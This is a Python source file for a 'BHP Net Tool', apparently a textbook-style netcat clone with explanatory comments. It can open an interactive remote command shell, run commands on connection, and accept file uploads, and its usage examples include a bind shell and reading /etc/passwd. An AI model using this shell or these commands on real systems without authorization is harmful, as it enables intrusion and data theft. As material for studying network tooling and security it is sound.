import argparse
import socket
import shlex
import subprocess
import sys
import textwrap
import threading

def execute(cmd):
	cmd = cmd.strip()
	if not cmd:
		return
	output = subprocess.check_output(shlex.split(cmd),
									stderr=subprocess.STDOUT)

	return output.decode()

class NetCat:
	def __init__(self, args, buffer=None):
		self.args = args
		self.buffer = buffer
		self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # Create a socket object
		self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) # SO_REUSEADDR allows the local address to be reused for a new socket even if there is a connection in a timeout state on the original socket.

	def run(self):
		if self.args.listen:
			self.listen()
		else:
			self.send()

	def send(self):
		self.socket.connect((self.args.target, self.args.port)) # connect to the target port and if we have a buffer, we send that to the target first
		if self.buffer:
			self.socket.send(self.buffer)
# Then, we set up a try/catch block so we can manually close the connection with CTRL-C
		try:
			while True: # we start a loop to receive data from the target
				recv_len = 1
				response = ''
				while recv_len:
					data = self.socket.recv(4096)
					recv_len = len(data)
					response += data.decode()
					if recv_len < 4096:
						break # if there is no more data, we break out of the loop
				if response:
					print(response)
					buffer = input('> ')
					buffer += '\n'
					self.socket.send(buffer.encode()) # otherwise, we print the response data and pause to get interactive input, send that input and continue the loop
		except KeyboardInterrupt: # The loop will continue until the KeyboardInterrupt occurs CTRL-C
			print('User terminated.')
			self.socket.close()
			sys.exit()

	def listen(self):
		self.socket.bind((self.args.target, self.args.port)) # the listen method binds to the target and port
		self.socket.listen(5)

		while True: # and starts listening in a loop
			client_socket, _= self.socket.accept()
			client_thread = threading.Thread( # passing the connected socket to the handle method
				target=self.handle, args=(client_socket,)
			)
			client_thread.start()

	def handle(self, client_socket):
		if self.args.execute:
			output = execute(self.args.execute)
			client_socket.send(output.encode())

		elif self.args.upload:
			file_buffer = b''
			while True:
				data = client_socket.recv(4096)
				if data:
					file_buffer += data
				else:
					break


			with open(self.args.upload, 'wb') as f:
				f.write(file_buffer)
			message = f'Saved file {self.args.upload}'
			client_socket.send(message.encode())

		elif self.args.command:
			cmd_buffer = b''
			while True:
				try:
					client_socket.send(b'BHP: #> ')
					while '\n' not in cmd_buffer.decode():
						cmd_buffer += client_socket.recv(64)
					response = execute(cmd_buffer.decode())
					if response:
						client_socket.send(response.encode())
					cmd_buffer = b''
				except Exception as e:
					print(f'server killed {e}')
					self.socket.close()
					sys.exit()

if __name__=='__main__':
	parser = argparse.ArgumentParser(
		description='BHP Net Tool',
		formatter_class=argparse.RawDescriptionHelpFormatter,
		epilog=textwrap.dedent('''Example:
	netcat.py -t 192.168.1.108 -p 5555 -l -c # command shell
	netcat.py -t 192.168.1.108 -p 5555 -l -u=mytest.txt # upload to file
	netcat.py -t 192.168.1.108 -p 5555 -l -e=\"cat /etc/passwd\" execute command
	echo 'ABC' | ./netcat.py -t 192.168.1.108 -p 135 # echo text to server port 135
	netcat.py -t 192.168.1.108 -p 5555 # connect to server
		'''))
	parser.add_argument('-c', '--command', action='store_true', help='command shell')
	parser.add_argument('-e', '--execute', help='execute specified command')
	parser.add_argument('-l', '--listen', action='store_true', help='listen')
	parser.add_argument('-p', '--port', type=int, default=5555, help='specified port')
	parser.add_argument('-t', '--target', default='192.168.1.203', help='specified IP')
	parser.add_argument('-u', '--upload', help='upload file')
	args = parser.parse_args()
	if args.listen:
		buffer = ''
	else:
		buffer = sys.stdin.read()

	nc = NetCat(args, buffer.encode())
	nc.run()
